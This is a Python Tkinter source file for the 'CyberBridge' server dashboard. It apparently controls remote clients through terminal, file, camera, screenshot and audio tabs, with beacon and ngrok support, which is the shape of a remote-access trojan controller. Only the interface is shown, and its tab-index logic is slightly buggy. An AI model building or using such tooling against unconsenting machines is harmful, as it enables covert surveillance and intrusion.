"""
CyberBridge - Main Dashboard (Server UI)
Full Tkinter interface: session list on the left, tabbed panels on the right.
Green-on-black matrix aesthetic.
"""

import tkinter as tk
from tkinter import ttk
import threading
import time
import datetime
import sys
import os

# ─── Path setup ───────────────────────────────────────────────────────────────
_ROOT = os.path.join(os.path.dirname(__file__), '..', '..')
sys.path.insert(0, _ROOT)

from server.ui.styles           import *
from server.ui.connection_panel import ConnectionPanel
from server.ui.terminal_panel   import TerminalPanel
from server.ui.camera_panel     import CameraPanel
from server.ui.screenshot_panel import ScreenshotPanel
from server.ui.sysinfo_panel    import SystemInfoPanel
from server.ui.audio_panel      import AudioPanel
from server.ui.file_panel       import FilePanel
from server.core.session_manager import SessionManager


# ─── Animated Matrix Rain Canvas ─────────────────────────────────────────────

class MatrixRain(tk.Canvas):
    """Lightweight matrix rain effect for the splash/idle area."""

    CHARS  = "0123456789ABCDEF<>{}[]|/\\!@#$%^&*"
    COLS   = 40
    SPEED  = 80    # ms per frame

    def __init__(self, parent, **kwargs):
        super().__init__(parent, bg=BG_DEEP, bd=0, highlightthickness=0, **kwargs)
        self._drops = [0] * self.COLS
        self._running = False
        self.bind("<Configure>", self._on_resize)

    def start(self):
        self._running = True
        self._animate()

    def stop(self):
        self._running = False

    def _on_resize(self, event):
        self._drops = [0] * self.COLS

    def _animate(self):
        if not self._running:
            return
        self.delete("all")
        w   = self.winfo_width()  or 400
        h   = self.winfo_height() or 300
        cw  = max(w // self.COLS, 1)

        import random
        for i, y in enumerate(self._drops):
            ch  = random.choice(self.CHARS)
            x   = i * cw + cw // 2
            py  = y * 16

            # Lead char (bright)
            self.create_text(x, py,  text=ch, fill=FG_WHITE,  font=FONT_MONO_SM, anchor="center")
            # Trail (dimmer)
            if py - 16 > 0:
                self.create_text(x, py - 16, text=random.choice(self.CHARS),
                                 fill=FG_PRIMARY, font=FONT_MONO_SM, anchor="center")
            if py - 32 > 0:
                self.create_text(x, py - 32, text=random.choice(self.CHARS),
                                 fill=FG_DIM,     font=FONT_MONO_SM, anchor="center")

            if py > h + random.randint(0, 20):
                self._drops[i] = 0
            else:
                self._drops[i] += 1

        self.after(self.SPEED, self._animate)


# ─── Main Dashboard Window ────────────────────────────────────────────────────

class Dashboard:
    """
    Main application window.
    Left: ConnectionPanel (session list)
    Right: Notebook with Terminal / Camera / Screenshot / SysInfo / Audio tabs
    """

    APP_TITLE   = "CyberBridge  v1.0  ▮  Remote Monitoring Station"
    WIN_SIZE    = "1400x820"
    MIN_SIZE    = (1100, 680)

    def __init__(self):
        self._root    = tk.Tk()
        self._session = None
        self._mgr     = None
        self._setup_root()
        self._build_menu()
        self._build_layout()
        self._start_session_manager()
        self._start_clock()

    # ─── Root window ──────────────────────────────────────────────────────────

    def _setup_root(self):
        r = self._root
        r.title(self.APP_TITLE)
        r.geometry(self.WIN_SIZE)
        r.minsize(*self.MIN_SIZE)
        r.configure(bg=BG_DEEP)
        r.protocol("WM_DELETE_WINDOW", self._on_close)

        # Custom ttk notebook style
        style = ttk.Style(r)
        style.theme_use("clam")
        style.configure("CyberBridge.TNotebook",
                        background=BG_DEEP, borderwidth=0)
        style.configure("CyberBridge.TNotebook.Tab",
                        background=BG_CARD, foreground=FG_DIM,
                        font=FONT_BUTTON, padding=[10, 5],
                        borderwidth=0)
        style.map("CyberBridge.TNotebook.Tab",
                  background=[("selected", BG_PANEL)],
                  foreground=[("selected", FG_PRIMARY)])

    # ─── Menu bar ─────────────────────────────────────────────────────────────

    def _build_menu(self):
        mb = tk.Menu(self._root, bg=BG_CARD, fg=FG_PRIMARY,
                     activebackground=BG_PANEL,
                     activeforeground=FG_CYAN, bd=0)
        self._root.config(menu=mb)

        fm = tk.Menu(mb, tearoff=0, bg=BG_CARD, fg=FG_PRIMARY,
                     activebackground=BG_PANEL, activeforeground=FG_CYAN)
        mb.add_cascade(label="File", menu=fm)
        fm.add_command(label="Settings", command=self._open_settings)
        fm.add_separator()
        fm.add_command(label="Exit", command=self._on_close)

        hm = tk.Menu(mb, tearoff=0, bg=BG_CARD, fg=FG_PRIMARY,
                     activebackground=BG_PANEL, activeforeground=FG_CYAN)
        mb.add_cascade(label="Help", menu=hm)
        hm.add_command(label="About CyberBridge", command=self._show_about)

    # ─── Layout ───────────────────────────────────────────────────────────────

    def _build_layout(self):
        root = self._root

        # ── Top banner ────────────────────────────────────────────────────────
        banner = tk.Frame(root, bg=BG_CARD,
                          highlightbackground=FG_DIM, highlightthickness=1)
        banner.pack(fill="x")

        tk.Label(banner, text="⬡  CYBERBRIDGE",
                 font=("Consolas", 18, "bold"),
                 bg=BG_CARD, fg=FG_PRIMARY).pack(side="left", padx=16, pady=8)

        tk.Label(banner, text="REMOTE MONITORING STATION",
                 font=("Consolas", 11),
                 bg=BG_CARD, fg=FG_DIM).pack(side="left", padx=0)

        self._clock_lbl = tk.Label(banner, text="",
                                   font=FONT_MONO_LG,
                                   bg=BG_CARD, fg=FG_SECONDARY)
        self._clock_lbl.pack(side="right", padx=16)

        self._status_lbl = tk.Label(banner, text="● AWAITING CONNECTIONS",
                                    font=FONT_MONO_SM,
                                    bg=BG_CARD, fg=FG_DIM)
        self._status_lbl.pack(side="right", padx=16)

        # ── Main body ─────────────────────────────────────────────────────────
        body = tk.Frame(root, bg=BG_DEEP)
        body.pack(fill="both", expand=True)

        # Left panel (connection list)
        self._conn_panel = ConnectionPanel(body,
                                           on_select_session=self._on_select_session,
                                           on_delete_session=self._remove_session,
                                           width=320)
        self._conn_panel.pack(side="left", fill="y", padx=(4, 2), pady=4)

        # Right: notebook with tabs
        right = tk.Frame(body, bg=BG_DEEP)
        right.pack(side="left", fill="both", expand=True, padx=(2, 4), pady=4)

        # Session title bar
        self._session_bar = tk.Frame(right, bg=BG_CARD,
                                     highlightbackground=BORDER_COLOR,
                                     highlightthickness=1)
        self._session_bar.pack(fill="x", pady=(0, 4))

        self._session_lbl = tk.Label(self._session_bar,
                                     text="[ No session selected — click a client ]",
                                     font=FONT_MONO_LG, bg=BG_CARD,
                                     fg=FG_DIM, anchor="w")
        self._session_lbl.pack(side="left", padx=12, pady=6)

        self._connect_btn = tk.Button(self._session_bar, text="⚡ CONNECT",
                                      command=self._connect_selected,
                                      **STYLE_BUTTON)
        self._connect_btn.pack(side="right", padx=4, pady=4)
        self._disconnect_btn = tk.Button(self._session_bar, text="✕ DISCONNECT",
                                         command=self._disconnect_selected,
                                         **STYLE_BUTTON_DANGER)
        self._disconnect_btn.pack(side="right", padx=4, pady=4)

        # Notebook tabs
        self._nb = ttk.Notebook(right, style="CyberBridge.TNotebook")
        self._nb.pack(fill="both", expand=True)

        self._term_panel  = TerminalPanel(self._nb)
        self._sys_panel   = SystemInfoPanel(self._nb)
        self._file_panel  = FilePanel(self._nb)
        self._cam_panel   = CameraPanel(self._nb)
        self._ss_panel    = ScreenshotPanel(self._nb)
        self._audio_panel = AudioPanel(self._nb)

        # Matrix rain idle tab
        self._matrix     = MatrixRain(self._nb)

        self._nb.add(self._term_panel,  text="  ▶ TERMINAL  ")
        self._nb.add(self._sys_panel,   text="  ◆ SYSINFO   ")
        self._nb.add(self._file_panel,  text="  📂 FILES    ")
        self._nb.add(self._cam_panel,   text="  ◉ CAMERA    ")
        self._nb.add(self._ss_panel,    text="  ⎙ SCREENSHOT")
        self._nb.add(self._audio_panel, text="  🎙 AUDIO     ")
        self._nb.add(self._matrix,      text="  ◈ MATRIX    ")

        # Start matrix on last tab select
        self._nb.bind("<<NotebookTabChanged>>", self._on_tab_change)

        # ── Status bar at bottom ──────────────────────────────────────────────
        sb = tk.Frame(root, bg=BG_CARD,
                      highlightbackground=FG_DIM, highlightthickness=1)
        sb.pack(fill="x", side="bottom")
        self._bottom_lbl = tk.Label(sb,
                                    text="CyberBridge Server  |  HTTP :18812  |  ngrok compatible",
                                    bg=BG_CARD, fg=FG_DIM, font=FONT_STATUS, anchor="w")
        self._bottom_lbl.pack(side="left", padx=8, pady=3)

        self._conn_count_lbl = tk.Label(sb, text="Clients: 0",
                                        bg=BG_CARD, fg=FG_SECONDARY,
                                        font=FONT_STATUS)
        self._conn_count_lbl.pack(side="right", padx=8)

    # ─── Session management ───────────────────────────────────────────────────

    def _on_select_session(self, session):
        self._session = session
        self._session_lbl.config(
            text=f"◈ {session.hostname}  |  {session.ip}:{session.port}  |  {session.status_str}",
            fg=FG_CYAN if session.status_str == "ONLINE" else FG_YELLOW,
        )

    def _connect_selected(self):
        if not self._session:
            return
        def _do():
            ok = self._session.connect()
            if ok:
                self._session_lbl.config(
                    text=f"⚡ {self._session.hostname}  |  CONNECTED",
                    fg=FG_CYAN,
                )
                self._term_panel.set_session(self._session)
                self._sys_panel.set_session(self._session)
                self._file_panel.set_session(self._session)
                self._cam_panel.set_session(self._session)
                self._ss_panel.set_session(self._session)
                self._audio_panel.set_session(self._session)
                self._status_lbl.config(
                    text=f"● CONNECTED: {self._session.hostname}",
                    fg=FG_CYAN
                )
            else:
                self._session_lbl.config(
                    text=f"✗ Cannot connect to {self._session.hostname}",
                    fg=FG_RED,
                )
        threading.Thread(target=_do, daemon=True).start()

    def _disconnect_selected(self):
        if self._session:
            self._session.disconnect()
            self._term_panel.clear_session()
            self._sys_panel.clear_session()
            self._file_panel.clear_session()
            self._cam_panel.clear_session()
            self._ss_panel.clear_session()
            self._audio_panel.clear_session()
            self._session_lbl.config(
                text="[ Disconnected ]", fg=FG_DIM
            )
            self._status_lbl.config(text="● AWAITING CONNECTIONS", fg=FG_DIM)

    def _remove_session(self, session):
        if not self._mgr or not session:
            return
        self._mgr.remove_session(session.client_id)
        if self._session and self._session.client_id == session.client_id:
            self._term_panel.clear_session()
            self._sys_panel.clear_session()
            self._cam_panel.clear_session()
            self._ss_panel.clear_session()
            self._audio_panel.clear_session()
            self._session = None
            self._session_lbl.config(
                text="[ No session selected — click a client ]", fg=FG_DIM
            )
            self._status_lbl.config(text="● AWAITING CONNECTIONS", fg=FG_DIM)
        self._on_sessions_update()

    # ─── Session manager ──────────────────────────────────────────────────────

    def _start_session_manager(self):
        self._mgr = SessionManager(on_client_update=self._on_sessions_update)
        self._mgr.start()

    def _on_sessions_update(self):
        sessions = self._mgr.get_sessions()
        self._conn_panel.update_sessions(sessions)
        self._conn_count_lbl.config(text=f"Clients: {len(sessions)}")

    # ─── Clock ────────────────────────────────────────────────────────────────

    def _start_clock(self):
        def _tick():
            while True:
                now = datetime.datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
                self._clock_lbl.config(text=now)
                time.sleep(1)
        threading.Thread(target=_tick, daemon=True).start()

    # ─── Tab change ───────────────────────────────────────────────────────────

    def _on_tab_change(self, event):
        tab = self._nb.index("current")
        if tab == 5:   # Matrix tab
            self._matrix.start()
        else:
            self._matrix.stop()

    # ─── Dialogs ──────────────────────────────────────────────────────────────

    def _open_settings(self):
        win = tk.Toplevel(self._root)
        win.title("Settings")
        win.configure(bg=BG_PANEL)
        win.geometry("400x200")
        tk.Label(win, text="Server Configuration",
                 font=FONT_MONO_XL, bg=BG_PANEL, fg=FG_PRIMARY).pack(pady=20)
        tk.Label(win, text="Beacon Port:  18812\nRPC Port:      18813",
                 font=FONT_MONO, bg=BG_PANEL, fg=FG_SECONDARY).pack()

    def _show_about(self):
        win = tk.Toplevel(self._root)
        win.title("About")
        win.configure(bg=BG_PANEL)
        win.geometry("420x200")
        tk.Label(win, text="⬡  CYBERBRIDGE  v1.0",
                 font=FONT_TITLE, bg=BG_PANEL, fg=FG_PRIMARY).pack(pady=16)
        tk.Label(win,
                 text="Remote Monitoring Station\n"
                      "RPC via RPyC  |  AES-256 encryption\n"
                      "Terminal · Camera · Audio · Screenshot",
                 font=FONT_MONO, bg=BG_PANEL, fg=FG_SECONDARY).pack()

    # ─── Lifecycle ────────────────────────────────────────────────────────────

    def _on_close(self):
        if self._mgr:
            self._mgr.stop()
        self._root.destroy()

    def run(self):
        self._matrix.start()          # Start rain on the matrix tab
        self._matrix.stop()           # But stop immediately (only on tab select)
        self._root.mainloop()
